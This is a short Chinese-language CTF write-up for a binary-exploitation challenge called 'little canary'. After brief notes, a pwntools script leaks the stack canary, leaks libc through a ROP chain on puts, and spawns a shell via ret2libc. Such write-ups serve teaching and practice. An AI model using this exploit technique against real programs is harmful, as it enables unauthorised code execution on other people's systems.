# little canary

## 文件分析

下载`pwn`, NX on, PIE off, Canary on, RELRO partial  
ghidra分析为64位程序

## 逆向

先溢出字符数组读取Canary的值

**注意：Canary的第一字节是\0，需要先覆盖才能打印出后面内容，之后还要还原**

获取canary的值后就可以考虑rop  
由于不存在后门且开了NX，所以后面根据ret2libc做即可

## EXPLOIT

```python
import LibcSearcher
from pwn import *

sh = remote('localhost', 43655)

# payload 1
sh.sendline(b'0'*68 + b'FLAG') # override the canary first byte '\0' with '\n'

sh.recvuntil(b'FLAG\n') # skip
canary = u64(b'\0' + sh.recvline()[:7]) # restore the overrided '\0'

elf = ELF('canary')
putsPlt = elf.plt['puts']
putsGot = elf.got['puts']
popRdiAddr = 0x00401343
vulnAddr = elf.symbols['vuln']

# payload 2
sh.sendline(b'0'*72 + p64(canary) + b'0'*8 + p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(vulnAddr))

sh.recvline() # skip
putsGotAddr = u64(sh.recvline()[-7:-1] + b'\0\0')
libc = LibcSearcher.LibcSearcher("puts", putsGotAddr & 0xfff)
libcBase = putsGotAddr - libc.dump("puts")
shstrAddr = libcBase + libc.dump("str_bin_sh")
systemAddr = libcBase + libc.dump("system")
retAddr = 0x004012b9

# payload 3
sh.sendline(b'skip this input')

# payload 4
sh.sendline(b'0'*72 + p64(canary) + b'0'*8 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr))

sh.interactive()
```

Done.
